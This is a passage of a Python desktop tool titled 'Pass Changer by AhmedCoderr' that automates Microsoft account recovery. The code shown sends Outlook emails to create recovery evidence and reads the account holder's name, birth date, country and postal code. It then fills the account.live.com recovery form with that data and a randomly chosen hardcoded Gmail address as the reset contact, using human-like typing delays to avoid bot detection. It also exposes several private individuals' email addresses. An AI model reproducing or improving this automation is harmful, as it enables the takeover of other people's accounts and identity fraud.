                    self.log_signal.emit("Trying JavaScript to find To field...")
                    self.driver.execute_script("""
                        var toInputs = document.querySelectorAll('input[aria-label*="To"], div[aria-label*="To"][contenteditable="true"]');
                        if (toInputs.length > 0) {
                            toInputs[0].focus();
                            toInputs[0].click();
                        }
                    """)
                    time.sleep(0.5)
                    to_field = self.driver.switch_to.active_element
                except Exception as e:
                    self.log_signal.emit(f"JavaScript fallback failed: {e}")
                    raise Exception("Could not find 'To' field to type recipients.")

            # Ensure focus on To field with multiple attempts (human-like, slower)
            try:
                # Scroll into view
                self.driver.execute_script("arguments[0].scrollIntoView({block: 'center', behavior: 'smooth'});", to_field)
                time.sleep(random.uniform(1.0, 2.0))  # Slower human-like pause
                to_field.click()
                time.sleep(random.uniform(1.0, 1.8))  # Slower human-like pause
                # Try JavaScript click as well
                self.driver.execute_script("arguments[0].focus(); arguments[0].click();", to_field)
                time.sleep(random.uniform(0.8, 1.5))  # Slower human-like pause
            except Exception as e:
                self.log_signal.emit(f"Focus attempt warning: {e}")

            # Type all recipients separated by semicolons
            all_recipients_str = "; ".join(target_emails_for_one_send)
            
            # Clear field first if needed
            try:
                to_field.clear()
            except Exception:
                try:
                    self.driver.execute_script("arguments[0].value = '';", to_field)
                except Exception:
                    pass
            
            self._human_like_type(to_field, all_recipients_str)
            self.collected_emails = target_emails_for_one_send.copy()
            self.log_signal.emit(f"Entered recipients: {all_recipients_str}")

            # Human-like pause after typing recipients (slower)
            self.cpu_intensive_delay(2.5, 4.0)  # Slower human-like pause

            # Move to subject field explicitly
            subject_field = None
            subject_selectors = [
                (By.CSS_SELECTOR, 'input[placeholder="Add a subject"]'),
                (By.CSS_SELECTOR, 'input[aria-label="Add a subject"]'),
                (By.CSS_SELECTOR, 'input[aria-label*="Subject"]'),
                (By.XPATH, "//input[@name='subject']"),
            ]
            for by, selector in subject_selectors:
                try:
                    subject_field = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((by, selector))
                    )
                    self.log_signal.emit(
                        f"Subject field found using selector: {selector}"
                    )
                    break
                except Exception:
                    continue
            if subject_field is None:
                self.log_signal.emit(
                    "Could not find subject field via selectors, using TAB fallback..."
                )
                actions = ActionChains(self.driver)
                actions.send_keys(Keys.TAB).send_keys(Keys.TAB).perform()
                subject_field = self.driver.switch_to.active_element

            # Human-like pause before typing subject (slower)
            time.sleep(random.uniform(1.5, 2.5))
            subject_text = random.choice(self.random_subjects)
            self._human_like_type(subject_field, subject_text)
            self.collected_subjects.append(subject_text)
            self.log_signal.emit(f"Entered subject: '{subject_text}'")
            time.sleep(random.uniform(1.5, 2.5))  # Slower human-like pause

            # Message body
            body_field = None
            body_selectors = [
                (
                    By.XPATH,
                    "//div[@role='textbox' and contains(translate(@aria-label,"
                    "'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'message body')]",
                ),
                (By.XPATH, "//div[contains(@aria-label,'Message body')]"),
            ]
            for by, selector in body_selectors:
                try:
                    body_field = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((by, selector))
                    )
                    self.log_signal.emit(
                        f"Message body found using selector: {selector}"
                    )
                    break
                except Exception:
                    continue
            if body_field is None:
                self.log_signal.emit(
                    "Could not find message body explicitly, using TAB fallback..."
                )
                ActionChains(self.driver).send_keys(Keys.TAB).perform()
                body_field = self.driver.switch_to.active_element

            # Human-like pause before typing body (slower)
            time.sleep(random.uniform(2.0, 3.5))
            self._human_like_type(
                body_field, random.choice(self.random_messages)
            )
            self.log_signal.emit("Entered random message.")
            # Human-like pause before sending (slower)
            self.cpu_intensive_delay(2.5, 4.0)

            self.log_signal.emit("Attempting to click 'Send' button...")
            try:
                send_button = self._wait_for_send_button_icon()
                self.log_signal.emit("Clicking located Send button...")
                send_button.click()
            except Exception as e_send_button:
                self.log_signal.emit(
                    f"Send button locator/click failed: {e_send_button}. "
                    "Attempting CTRL+ENTER as a fallback..."
                )
                try:
                    ActionChains(self.driver).key_down(Keys.CONTROL).send_keys(
                        Keys.ENTER
                    ).key_up(Keys.CONTROL).perform()
                    self.log_signal.emit("Pressed CTRL+ENTER to send email.")
                except Exception as e_ctrl:
                    self.log_signal.emit(
                        f"CTRL+ENTER fallback also failed: {e_ctrl}"
                    )
                    raise

            time.sleep(random.uniform(4.0, 6.0))  # Slower human-like pause after sending
            self.log_signal.emit(
                f"Email sent to {', '.join(target_emails_for_one_send)}"
            )

        except Exception as e:
            self.log_signal.emit(f"Failed during email composition and sending: {e}")
            raise

        if len(self.collected_subjects) >= 1:
            # ensure exactly 2 subjects
            self.collected_subjects.append("Hey! This is Plan B")
            self.collected_subjects = self.collected_subjects[:2]
        else:
            self.log_signal.emit(
                "Warning: No subject was captured. Using two default subjects."
            )
            self.collected_subjects = [
                "Hello! I am automating some things.",
                "Hey! This is Plan B",
            ]

        self.log_signal.emit(f"Final Collected Emails: {self.collected_emails}")
        self.log_signal.emit(f"Final Collected Subjects: {self.collected_subjects}")
        self.progress_update_signal.emit(45, "Outlook processing complete.")

    def _initialize_recovery_form(self):
        """Navigates to recovery form and enters initial details."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(45, "Initializing recovery form...")
        self.log_signal.emit(
            "Navigating to Microsoft Recovery page (account.live.com/acsr)..."
        )
        self.driver.get("https://account.live.com/acsr")

        self.log_signal.emit("Waiting for AccountNameInput field...")
        self.log_signal.emit(
            "Please complete CAPTCHA + email verification in browser. "
            "The bot will auto-detect when to proceed."
        )
        account_name_input_field = WebDriverWait(self.driver, 60).until(
            EC.presence_of_element_located((By.ID, "AccountNameInput"))
        )
        self.log_signal.emit("AccountNameInput field found.")
        self.progress_update_signal.emit(50, "Recovery form loaded.")
        time.sleep(random.uniform(0.3, 0.6))  # Reduced delay  # Reduced from 1.5-3.0 to 0.8-1.5

        if getattr(self, "email_addr", "Not Available") == "Not Available":
            self.log_signal.emit(
                "Primary email not found, cannot proceed with recovery."
            )
            raise Exception("Primary email for recovery not available.")

        self._human_like_type(account_name_input_field, self.email_addr)
        self.log_signal.emit(f"Entered primary email for recovery: {self.email_addr}")
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay  # Reduced delay

        # Try to locate alternate email field explicitly if possible
        alt_field = None
        alt_selectors = [
            (By.CSS_SELECTOR, 'input[type="email"]'),
            (By.XPATH, "//input[@type='email' and not(@id='AccountNameInput')]"),
        ]
        for by, selector in alt_selectors:
            try:
                candidates = self.driver.find_elements(by, selector)
                # pick the second email-like field if available
                if len(candidates) >= 2:
                    alt_field = candidates[1]
                elif candidates:
                    alt_field = candidates[0]
                if alt_field:
                    self.log_signal.emit(
                        f"Alternate email field found using selector: {selector}"
                    )
                    break
            except Exception:
                continue

        if alt_field is None:
            # fallback: TAB once
            ActionChains(self.driver).send_keys(Keys.TAB).perform()
            time.sleep(random.uniform(0.2, 0.4))  # Reduced delay  # Reduced delay
            alt_field = self.driver.switch_to.active_element

        alt_emails_options = [
            "opsidianyt22@gmail.com",
            "khurshidiasmad22@gmail.com",
            "skylergamer180@gmail.com",
            "khurshidiahmad22@gmail.com",
        ]
        chosen_alt_email = random.choice(alt_emails_options)

        self._human_like_type(alt_field, chosen_alt_email)
        self.alt_email = chosen_alt_email
        self.log_signal.emit(f"Entered alternate contact email: {self.alt_email}")
        self.progress_update_signal.emit(55, "Alternate email entered.")

        # Move focus to next section (optimized)
        for _ in range(4):
            ActionChains(self.driver).send_keys(Keys.TAB).perform()
            time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

    def _wait_for_identity_form_and_fill(self):
        """Waits for the identity verification form to appear and then fills it."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(60, "Waiting for identity verification form...")
        dob_field_found = False
        wait_start_time = time.time()
        timeout_duration = 6.9 * 60
        check_interval = 5  # Check every 5 seconds

        while time.time() - wait_start_time < timeout_duration:
            try:
                WebDriverWait(self.driver, check_interval).until(
                    EC.presence_of_element_located((By.ID, "BirthDate_monthInput"))
                )
                dob_field_found = True
                break
            except TimeoutException:
                elapsed = time.time() - wait_start_time
                if elapsed % 30 < check_interval:  # Log every ~30 seconds
                    self.log_signal.emit(
                        f"Still waiting for identity form... ({int(elapsed)}s elapsed)"
                    )
                time.sleep(check_interval)
            except Exception as e:
                self.log_signal.emit(f"Error while waiting for identity form: {e}")
                time.sleep(check_interval)

        if not dob_field_found:
            self.log_signal.emit(
                "Timeout: Identity form (DOB fields) did not appear within 6.9 minutes. "
                "Please manually fill or restart."
            )
            raise Exception("Identity form did not appear.")
        else:
            self.log_signal.emit(
                "✅ Identity verification form loaded successfully! Auto-filling..."
            )
            self.progress_update_signal.emit(
                65, "Identity form loaded. Auto-filling details..."
            )
            self._fill_identity_details()

    def _fill_identity_details(self):
        """Fills the identity verification form with scraped data."""
        if not self.driver:
            self.log_signal.emit(
                "❌ Error: WebDriver is not initialized for identity verification. "
                "Browser might have been closed prematurely."
            )
            raise Exception("WebDriver not initialized.")

        self.log_signal.emit("▶️ Identity form filling initiated automatically.")
        self.log_signal.emit("[DEBUG] Current scraped values:")
        self.log_signal.emit(f"  First Name: {self.first_name}")
        self.log_signal.emit(f"  Last Name: {self.last_name}")
        self.log_signal.emit(f"  DOB: {self.dob}")
        self.log_signal.emit(f"  Country: {self.country}")
        self.log_signal.emit(f"  Postal: {self.postal}")

        all_data_missing = (
            (self.first_name == "Not Available" or not self.first_name.strip())
            and (self.last_name == "Not Available" or not self.last_name.strip())
            and (self.dob == "Not Available" or not self.dob.strip())
            and (self.country == "Not Available" or not self.country.strip())
            and (not self.postal.strip())
        )

        if all_data_missing:
            self.log_signal.emit(
                "❌ Error: All critical identity information is missing. "
                "Cannot proceed with form filling."
            )
            raise Exception("All identity data missing.")

        actions = ActionChains(self.driver)
        self.progress_update_signal.emit(70, "Entering personal details...")

        try:
            first_name_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (By.XPATH, "//input[@id='FirstNameInput']")
                )
            )
            if self.first_name != "Not Available" and self.first_name.strip():
                self._human_like_type(first_name_field, self.first_name)
                self.log_signal.emit(f"Entered First Name: {self.first_name}")
            else:
                self.log_signal.emit("Skipping First Name: data not available.")
        except Exception as e:
            self.log_signal.emit(
                f"⚠️ First name field not found or input failed: {e}"
            )

        time.sleep(random.uniform(0.3, 0.6))  # Reduced delay

        self.log_signal.emit("Tabbing to Last Name field...")
        actions.send_keys(Keys.TAB).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        if self.last_name != "Not Available" and self.last_name.strip():
            try:
                last_name_field = self.driver.switch_to.active_element
                self._human_like_type(last_name_field, self.last_name)
                self.log_signal.emit(
                    f"Entered Last Name (into active element): {self.last_name}"
                )
            except Exception as e:
                self.log_signal.emit(
                    f"⚠️ Could not type last name into active element: {e}"
                )
        else:
            self.log_signal.emit("Skipping Last Name: data not available.")

        time.sleep(random.uniform(1.5, 2.5))

        if self.dob and "/" in self.dob and self.dob != "Not Available":
            try:
                m, d, y = self.dob.split("/")
                month_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located(
                            (By.ID, "BirthDate_monthInput")
                        )
                    )
                )
                time.sleep(random.uniform(0.2, 0.4))  # Reduced delay
                month_select.select_by_value(m.lstrip("0"))
                time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

                day_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.ID, "BirthDate_dayInput"))
                    )
                )
                day_select.select_by_value(d.lstrip("0"))
                time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

                year_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located(
                            (By.ID, "BirthDate_yearInput")
                        )
                    )
                )
                year_select.select_by_value(y)
                self.log_signal.emit(f"Entered DOB: {m}/{d}/{y}")
            except Exception as e_dob:
                self.log_signal.emit(f"⚠️ Failed to enter DOB parts: {e_dob}")
        else:
            self.log_signal.emit(
                "Skipping DOB: data not available or invalid format."
            )

        time.sleep(random.uniform(0.4, 0.8))  # Reduced delay

        country_to_select = (
            self.country if self.country != "Not Available" else "United States"
        )
        if self.country != "Not Available" and self.country.strip():
            try:
                country_select = Select(
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.ID, "CountryInput"))
                    )
                )
                country_select.select_by_visible_text(country_to_select)
                self.log_signal.emit(f"Selected Country: {country_to_select}")
            except Exception as e:
                self.log_signal.emit(
                    f"⚠️ Country '{country_to_select}' not selectable or field not found: {e}"
                )
        else:
            self.log_signal.emit("Skipping Country: data not available.")

        time.sleep(random.uniform(0.4, 0.8))  # Reduced delay
        self.progress_update_signal.emit(75, "Entering country and checking for state...")

        try:
            state_select_element = WebDriverWait(self.driver, 5).until(
                EC.presence_of_element_located((By.ID, "StateInput"))
            )
            state_select = Select(state_select_element)
            options = [
                option.text
                for option in state_select.options
                if option.text and option.text != "Select..."
            ]
            if options:
                # choose first non-placeholder state instead of random
                state_value = options[0]
                state_select.select_by_visible_text(state_value)
                self.log_signal.emit(f"Selected State: {state_value}")
            else:
                self.log_signal.emit("No selectable states found in the dropdown.")
        except Exception as e_state:
            self.log_signal.emit(
                f"⚠️ State field not found or could not select state (skipping): {e_state}"
            )

        time.sleep(random.uniform(0.4, 0.8))  # Reduced delay
        self.progress_update_signal.emit(80, "Filling postal code and final steps...")

        if self.postal and self.postal.strip():
            try:
                postal_field = WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located(
                        (By.XPATH, "//input[@id='PostalCodeInput']")
                    )
                )
                postal_field.click()
                self.log_signal.emit("Clicked Postal Code field.")
                self._human_like_type(postal_field, self.postal)
                self.log_signal.emit(f"Entered Postal Code: {self.postal}")
            except Exception as e_postal:
                self.log_signal.emit(
                    f"⚠️ Postal field entry sequence failed: {e_postal}"
                )
        else:
            self.log_signal.emit("Skipping Postal Code: data not available.")

        time.sleep(random.uniform(0.4, 0.8))  # Reduced delay
        # Let user move on / submit; Enter here is the same as clicking "Next"
        actions.send_keys(Keys.ENTER).perform()
        self.log_signal.emit("Pressed Enter to continue after identity details.")
        self.progress_update_signal.emit(85, "Completing final form fields...")

    def _handle_product_option_mail(self):
        """Waits for and interacts with ProductOptionMail checkbox and password field."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.log_signal.emit("Waiting for ProductOptionMail checkbox to appear...")
        self.progress_update_signal.emit(90, "Handling ProductOptionMail and password...")
        try:
            checkbox = WebDriverWait(self.driver, 300).until(
                EC.presence_of_element_located((By.ID, "ProductOptionMail"))
            )
            self.log_signal.emit("ProductOptionMail checkbox found!")

            time.sleep(random.uniform(0.4, 0.8))  # Reduced delay

            password_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (By.XPATH, "//input[@type='password' or @name='Password']")
                )
            )
            self._human_like_type(password_field, self.account_password)
            self.log_signal.emit("Entered account password")

            time.sleep(random.uniform(0.3, 0.6))  # Reduced delay

            checkbox.click()
            self.log_signal.emit("Clicked ProductOptionMail checkbox")

            time.sleep(random.uniform(0.3, 0.6))  # Reduced delay

            ActionChains(self.driver).send_keys(Keys.ENTER).perform()
            self.log_signal.emit("Pressed Enter after checkbox")

        except Exception as e_checkbox:
            self.log_signal.emit(
                f"Error handling ProductOptionMail checkbox or password field: {e_checkbox}"
            )
            raise

    def _perform_final_email_sequence(self):
        """Enters additional email addresses and subjects (replacing messages)."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.log_signal.emit("Starting final email and subject sequence...")
        self.progress_update_signal.emit(95, "Entering final emails and subjects...")
        time.sleep(random.uniform(1.0, 1.5))  # Reduced delay

        actions = ActionChains(self.driver)

        emails_to_enter = self.collected_emails[:3]
        if len(emails_to_enter) < 3:
            while len(emails_to_enter) < 3:
                emails_to_enter.append(
                    emails_to_enter[-1] if emails_to_enter else "example@example.com"
                )

        if len(self.collected_subjects) < 2:
            defaults = [
                "Hello! I am automating some things.",
                "Hey! This is Plan B",
            ]
            while len(self.collected_subjects) < 2:
                self.collected_subjects.append(
                    defaults[len(self.collected_subjects) % len(defaults)]
                )

        try:
            email_field1 = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (
                        By.XPATH,
                        "(//input[contains(@type, 'email') or contains(@type, 'text')])[1]",
                    )
                )
            )
            self._human_like_type(email_field1, emails_to_enter[0])
            self.log_signal.emit(f"Entered first email: {emails_to_enter[0]}")
        except Exception as e:
            self.log_signal.emit(f"Could not find/enter first email: {e}")
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        actions.send_keys(Keys.TAB).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        try:
            email_field2 = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (
                        By.XPATH,
                        "(//input[contains(@type, 'email') or contains(@type, 'text')])[2]",
                    )
                )
            )
            self._human_like_type(email_field2, emails_to_enter[1])
            self.log_signal.emit(f"Entered second email: {emails_to_enter[1]}")
        except Exception as e:
            self.log_signal.emit(f"Could not find/enter second email: {e}")
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        actions.send_keys(Keys.TAB).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        try:
            email_field3 = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located(
                    (
                        By.XPATH,
                        "(//input[contains(@type, 'email') or contains(@type, 'text')])[3]",
                    )
                )
            )
            self._human_like_type(email_field3, emails_to_enter[2])
            self.log_signal.emit(f"Entered third email: {emails_to_enter[2]}")
        except Exception as e:
            self.log_signal.emit(f"Could not find/enter third email: {e}")
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        self.log_signal.emit("Pressing TAB twice to reach first subject field...")
        actions.send_keys(Keys.TAB).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay
        actions.send_keys(Keys.TAB).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        first_subject = self.collected_subjects[0]
        self.log_signal.emit(f"Entering first subject: '{first_subject}'")
        try:
            current_active_element = self.driver.switch_to.active_element
            self._human_like_type(current_active_element, first_subject)
        except Exception as e:
            self.log_signal.emit(
                f"Could not find active element for first subject or input failed: {e}"
            )
            actions.send_keys(first_subject).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        actions.send_keys(Keys.TAB).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        second_subject = self.collected_subjects[1]
        self.log_signal.emit(f"Entering second subject: '{second_subject}'")
        try:
            current_active_element = self.driver.switch_to.active_element
            self._human_like_type(current_active_element, second_subject)
        except Exception as e:
            self.log_signal.emit(
                f"Could not find active element for second subject or input failed: {e}"
            )
            actions.send_keys(second_subject).perform()
        time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

        actions.send_keys(Keys.ENTER).perform()
        self.log_signal.emit("Pressed Enter to submit form.")

        self.log_signal.emit("Waiting before final Enter...")
        time.sleep(random.uniform(1.0, 2.0))  # Reduced delay

        actions.send_keys(Keys.ENTER).perform()
        self.log_signal.emit("Pressed final Enter (if any subsequent dialog).")

        self.log_signal.emit("Waiting before closing browser...")
        time.sleep(random.uniform(2.0, 3.0))  # Reduced delay
        self.progress_update_signal.emit(100, "Finalizing process.")

    def _get_profile_and_address_html_content(self):
        postal_codes_str = self.postal if self.postal else "Not Found"
        emails_html = (
            "<br>".join(self.collected_emails)
            if self.collected_emails
            else "<i>None collected</i>"
        )
        subjects_html = (
            "<br>".join(self.collected_subjects)
            if self.collected_subjects
            else "<i>None collected</i>"
        )

        # IMPORTANT: do not show the password in the summary for safety
        return f"""
<h2 style="color: #FFA500;">----- Profile Information -----</h2>
<p>
  <b>Full Name:</b> {self.first_name} {self.last_name}<br>
  <b>First Name:</b> {self.first_name}<br>
  <b>Last Name:</b> {self.last_name}<br>
  <b>DOB:</b> {self.dob}<br>
  <b>Country:</b> {self.country}<br>
  <b>Email:</b> {getattr(self, 'email_addr', 'Not Available')}<br>
</p>
<h2 style="color: #FFA500;">----- Address Book -----</h2>
<p>
  <b>Postal Codes:</b> {postal_codes_str}
</p>
<h2 style="color: #FFA500;">----- Outlook Emails & Subjects (for Recovery Form) -----</h2>
<p>
  <b>Collected Emails:</b><br>{emails_html}<br>
  <b>Collected Subjects:</b><br>{subjects_html}
</p>
"""

    @QtCore.pyqtSlot()
    def run(self):
        try:
            self.log_signal.emit(
                "Starting scraping process with CPU optimization and human-like typing..."
            )
            self.progress_update_signal.emit(0, "Starting bot...")

            self._initialize_driver()
            self._perform_login_check()
            self._extract_profile_info()
            self._extract_postal_code()
            self._process_outlook_sent_items()

            profile_and_address_html_content = (
                self._get_profile_and_address_html_content()
            )

            cursor_html = f"""
<div style="font-family: Segoe UI; color: #FFEFD5;">
    <h3 style="color: #FFA500;">📋 Profile & Address Information Extracted</h3>
    {profile_and_address_html_content}
    <hr style="border-color: #444; margin: 20px 0;">
    <p style="color: #FFD39B;"><i>Preparing for account recovery process... This will take a few seconds.</i></p>
</div>
"""
            self.intermediate_result_signal.emit(cursor_html)

            time.sleep(random.uniform(1, 2))  # Reduced delay
            self.log_signal.emit("✅ Starting RECOVERY block now...")

            recovery_attempts = 0
            max_recovery_attempts = 3

            while recovery_attempts < max_recovery_attempts:
                recovery_attempts += 1
                self.log_signal.emit(
                    f"Starting account recovery automation (Attempt {recovery_attempts})..."
                )
                try:
                    if recovery_attempts == 1:
                        self._initialize_recovery_form()
                    else:
                        self.log_signal.emit(
                            "Retrying recovery form with previously gathered info..."
                        )
                        self.driver.get("https://account.live.com/acsr")
                        WebDriverWait(self.driver, 60).until(
                            EC.presence_of_element_located(
                                (By.ID, "AccountNameInput")
                            )
                        )

                        account_name_input_field = self.driver.find_element(
                            By.ID, "AccountNameInput"
                        )
                        self._human_like_type(
                            account_name_input_field, getattr(self, "email_addr", "")
                        )
                        time.sleep(random.uniform(0.4, 0.8))  # Reduced delay
                        ActionChains(self.driver).send_keys(Keys.TAB).perform()
                        time.sleep(random.uniform(0.4, 0.8))  # Reduced delay

                        alt_email_field = self.driver.switch_to.active_element
                        self._human_like_type(
                            alt_email_field, getattr(self, "alt_email", "")
                        )
                        time.sleep(random.uniform(0.4, 0.8))  # Reduced delay
                        for _ in range(4):
                            ActionChains(self.driver).send_keys(Keys.TAB).perform()
                            time.sleep(random.uniform(0.2, 0.4))  # Reduced delay

                    self._wait_for_identity_form_and_fill()
                    self._handle_product_option_mail()
                    self._perform_final_email_sequence()

                    self.ask_retry_signal.emit()
                    self._retry_response = None

                    loop = QtCore.QEventLoop()
                    self.retry_decision_signal.connect(loop.quit)
                    loop.exec()

                    if self._retry_response:
                        self.log_signal.emit(
                            "User confirmed reset link received. Task successful!"
                        )
                        recovery_status_html_info = (
                            f"<b>Status:</b> Account recovery process completed successfully.<br>"
                            f"<b>Recovery Email Used:</b> {self.alt_email}<br>"
                            f"<b>Form Data:</b> All information filled and submitted automatically.<br>"
                            f"<b>Additional Emails Provided:</b> "
                            f"{'<br>'.join(self.collected_emails) if self.collected_emails else 'None'}<br>"
                            f"<b>Subjects Provided:</b> "
                            f"{'<br>'.join(self.collected_subjects) if self.collected_subjects else 'None'}"
                        )
                        final_result_html = f"""
<html>
  <body style="font-family: Segoe UI; color: #FFEFD5; background-color: #1b1b1b;">
    <h2 style="color: #00FF7F;">✅ TASK SUCCESSFUL ✅</h2>
    {self._get_profile_and_address_html_content()}
    <h2 style="color: #FFA500;">----- Recovery Process -----</h2>
    <p style="color: #FFD39B;">
      {recovery_status_html_info}
    </p>
  </body>
</html>
"""
                        self.full_process_completed_signal.emit(final_result_html)
                        break
                    else:
                        self.log_signal.emit(
                            "User requested retry. Re-attempting recovery form..."
                        )
                except Exception as e_recovery_attempt:
                    self.log_signal.emit(
                        f"❌ Error during recovery attempt {recovery_attempts}: {str(e_recovery_attempt)}"
                    )
                    self.cpu_intensive_delay(1, 2)  # Reduced delay
            else:
                self.log_signal.emit(
                    f"Maximum recovery attempts ({max_recovery_attempts}) reached. Could not confirm success."
                )
                recovery_status_html_info = (
                    f"<b>Status:</b> Max recovery attempts reached. Please check manually.<br>"
                    f"<b>Recovery Email Used:</b> {self.alt_email}<br>"
                    f"<b>Form Data:</b> Information filled and submitted automatically.<br>"
                    f"<b>Additional Emails Provided:</b> "
                    f"{'<br>'.join(self.collected_emails) if self.collected_emails else 'None'}<br>"
                    f"<b>Subjects Provided:</b> "
                    f"{'<br>'.join(self.collected_subjects) if self.collected_subjects else 'None'}"
                )
                final_result_html = f"""
<html>
  <body style="font-family: Segoe UI; color: #FFEFD5; background-color: #1b1b1b;">
    <h2 style="color: #FF8C00;">⚠️ PROCESS INCOMPLETE ⚠️</h2>
    {self._get_profile_and_address_html_content()}
    <h2 style="color: #FFA500;">----- Recovery Process Status -----</h2>
    <p style="color: #FFB347;">
      {recovery_status_html_info}
    </p>
  </body>
</html>
"""
                self.full_process_completed_signal.emit(final_result_html)

        except Exception as e:
            error_message = f"❌ Process failed: {str(e)}"
            self.log_signal.emit(error_message)
            recovery_status_html_info = (
                f"<b>Status:</b> Account recovery process encountered an error.<br>"
                f"<b>Error:</b> {str(e)}<br>"
                f"<b>Recovery Email (if set before error):</b> {self.alt_email}"
            )
            final_result_html = f"""
<html>
  <body style="font-family: Segoe UI; color: #FFEFD5; background-color: #1b1b1b;">
    <h2 style="color: #FF4500;">❌ PROCESS FAILED ❌</h2>
    {self._get_profile_and_address_html_content()}
    <h2 style="color: #FFA500;">----- Recovery Process Status -----</h2>
    <p style="color: #FF7F50;">
      {recovery_status_html_info}
    </p>
  </body>
</html>
"""
            self.full_process_completed_signal.emit(final_result_html)
        finally:
            self.close_browser()


class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Pass Changer by AhmedCoderr!")
        self.setFixedSize(1000, 800)
        self.thread = None
        self.worker = None
        self.initUI()

    def initUI(self):
        central_widget = QtWidgets.QWidget(self)
        self.setCentralWidget(central_widget)
        layout = QtWidgets.QVBoxLayout(central_widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(16)

        heading = QtWidgets.QLabel("Pass Changer by AhmedCoderr!", self)
        heading.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        heading.setStyleSheet(
            """
            font-size: 32px;
            font-weight: bold;
            color: #FFA500;
            padding: 10px;
            """
        )
        layout.addWidget(heading)

        subheading = QtWidgets.QLabel(
            "V0.1 Developer Build by AhmedCoderr", self
        )
        subheading.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        subheading.setStyleSheet(
            """
            font-size: 13px;
            color: #FFB347;
            """
        )
        layout.addWidget(subheading)

        button_container = QtWidgets.QHBoxLayout()
        button_container.addStretch(1)

        self.scrape_button = QtWidgets.QPushButton("Start!", self)
        self.scrape_button.setFixedHeight(60)
        self.scrape_button.setCursor(
            QtGui.QCursor(QtCore.Qt.CursorShape.PointingHandCursor)
        )
        self.scrape_button.setStyleSheet(
            """
            QPushButton {
                font-size: 20px;
                padding: 15px 35px;
                background-color: #FF8C00;
                color: white;
                border-radius: 12px;
                border: 1px solid #FFA500;
            }
            QPushButton:hover {
                background-color: #FFA733;
            }
            QPushButton:pressed {
                background-color: #CC7000;
            }
            QPushButton:disabled {
                background-color: #5c3c1a;
                color: #b0b0b0;
                border: 1px solid #774522;
            }
            """
        )
        self.scrape_button.clicked.connect(self.start_scraping)
        button_container.addWidget(self.scrape_button)
        button_container.addStretch(1)
        layout.addLayout(button_container)

        self.progress_bar = QtWidgets.QProgressBar(self)
        self.progress_bar.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setFormat("%p% - %v")
        self.progress_bar.setStyleSheet(
            """
            QProgressBar {
                border: 2px solid #FF8C00;
                border-radius: 6px;
                background-color: #2a2a2a;
                text-align: center;
                color: #FFEFD5;
                padding: 1px;
            }
            QProgressBar::chunk {
                background-color: qlineargradient(
                    spread:pad,
                    x1:0, y1:0, x2:1, y2:0,
                    stop:0 #FF8C00,
                    stop:0.5 #FFA500,
                    stop:1 #FFB347
                );
                width: 24px;
                margin: 1px;
            }
            """
        )
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)

        logs_label = QtWidgets.QLabel("Activity log and results", self)
        logs_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignLeft)
        logs_label.setStyleSheet(
            "font-size: 14px; color: #FFB347; margin-top: 8px;"
        )
        layout.addWidget(logs_label)

        self.text_edit = QtWidgets.QTextEdit(self)
        self.text_edit.setReadOnly(True)
        self.text_edit.setStyleSheet(
            """
            QTextEdit {
                font-size: 14px;
                background-color: #1b1b1b;
                color: #FFEFD5;
                border: 1px solid #FF8C00;
                border-radius: 6px;
                padding: 8px;
            }
            """
        )
        self.text_edit.setPlaceholderText("Logs and results will appear here...")
        layout.addWidget(self.text_edit)

        credit = QtWidgets.QLabel("Created by AhmedCoderr", self)
        credit.setAlignment(QtCore.Qt.AlignmentFlag.AlignRight)
        credit.setStyleSheet("font-size: 12px; color: #FFB347; margin-top: 4px;")
        layout.addWidget(credit)

        self.setStyleSheet(
            """
            QMainWindow {
                background-color: #121212;
            }
            QWidget {
                background-color: #121212;
            }
            """
        )

    def start_scraping(self):
        password, ok = QtWidgets.QInputDialog.getText(
            self,
            "Account Password",
            "Enter the account password:",
            QtWidgets.QLineEdit.EchoMode.Password,
        )
        if not ok or not password:
            self.append_log("No password provided. Aborting scraping process.")
            return

        self.text_edit.clear()
        self.progress_bar.setValue(0)
        self.progress_bar.setFormat("%p% - Initializing...")
        self.scrape_button.setEnabled(False)

        self.thread = QtCore.QThread(self)
